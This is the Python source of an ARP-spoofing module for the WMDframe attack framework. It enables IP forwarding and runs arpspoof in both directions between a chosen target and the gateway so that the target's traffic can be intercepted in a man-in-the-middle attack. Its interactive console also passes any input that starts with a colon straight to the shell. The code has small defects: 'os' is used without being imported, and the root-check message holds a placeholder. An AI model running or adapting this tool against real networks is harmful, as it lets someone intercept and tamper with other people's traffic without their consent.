#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


import argparse
from time import sleep
try:
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core.core as core
    import core.commands as comm
    import core.modules as cmodules
    from core.colors import bc as bc


# Parser
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='Target', metavar='IP') # Example. Use with "args.lanip"
parser.add_argument('-g', '--gateway', help='Gateway', metavar='IP') # Example. Use with "args.lanip"
parser.add_argument('-r', '--run', action='store_true', help='Start monitoring.')
args, unknown = parser.parse_known_args()

# Core
config = core.config()
logger = core.log()


# START Log files, global variables, etc.
ARPSPOOF_SYM = (config['TOOLS']['ARPSPOOF_SYM'])
# END Log files, global variables, etc.


# OPTIONS
class options():
    Author = 'Thomas TJ (TTJ)'
    Name = 'ARP spoof'
    Call = 'arpspoof'
    Modulename = 'spoof_arp'  # Filename
    Category = 'spoof'
    Type = 'arp'  # sin = single action/program, aut = multiple programs combined for attack
    Version = '0.1'
    License = 'MIT'
    Description = 'Spoofing ARP'
    Datecreation = '2017/01/01'
    Lastmodified = '2017/01/01'

    def __init__(self, target, gateway):
        self.target = target
        self.gateway = gateway
        self.show_all()

    # Possible options. These variables are checked when the user tries to 'set' an option
    def poss_opt(self):
        return ('target', 'gateway')

    # Show options
    def show_opt(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'target:', 8, 'y', 18, self.target, 'Setting1'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'gateway:', 8, 'n', 18, self.gateway, 'Setting2'))
            + '\n'
            )

    # Show commands
    def show_commands(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
            + '\n\t' + '---------'
            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
            + '\n'
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    print('')
    print('\t[*]  Turning on ip forwarding')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print('\t[*]  Starting ARP spoofing.')
    print('\t[!]  Press enter here or "Ctrl+c" in new terminals to clean up. Screwed up? Run command "killall arpspoof"')
    sleep(2)
    arpCom1 = (ARPSPOOF_SYM + ' -t ' + sop.target + ' ' + sop.gateway)
    arpCom2 = (ARPSPOOF_SYM + ' -t ' + sop.gateway + ' ' + sop.target)
    comm.runCommand(arpCom1)
    comm.runCommand2(arpCom2)
    kill = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'Kill arpspoof:' + bc.ENDC + ' ')
    print('\t[*]  Stopping ip forwarding')
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    print('\t[*]  Stopping ARP spoofing')
    os.system('killall arpspoof')
    print('')


def info():
    print("""
        Module for use in WMDframe.

        Spoof ARP table in target and router for intercepting traffic.""")

    if parser.format_help():
        print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
        for line in parser.format_help().strip().splitlines():
            print('\t' + line)
    print('')


# CONSOLE
def console():
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'tmpmod:' + bc.ENDC + ' ')
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter"
        # uservalue = value.split(' ', 2)[2]  # Use all text after "set parameter"
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(options.Call)
        return None
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


def main():
    print('\n')
    print('\t    ___    ____  ____                         ____  ')
    print('\t   /   |  / __ \/ __ \_________  ____  ____  / __/  ')
    print('\t  / /| | / /_/ / /_/ / ___/ __ \/ __ \/ __ \/ /_    ')
    print('\t / ___ |/ _, _/ ____(__  ) /_/ / /_/ / /_/ / __/    ')
    print('\t/_/  |_/_/ |_/_/   /____/ .___/\____/\____/_/       ')
    print('\t                       /_/                          ')
    print('\n')
    if os.getuid() != 0:
        print('r00tness is needed due to XXX!')
        print('Run the script again as root/sudo')
        return None
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalled(ARPSPOOF_SYM)
    print('')
    global sop
    # The parameters to be passed to the module on init
    if args.target:
        target = args.target
    else:
        target = ''
    if args.gateway:
        gateway = args.gateway
    else:
        gateway = comm.getGateway()
    sop = options(target, gateway)
    if args.run:
        run()
    else:
        console()


if args.run:
    main()


# For testing uncomment "main()" and run module with "python3 modulename.py"
# main()
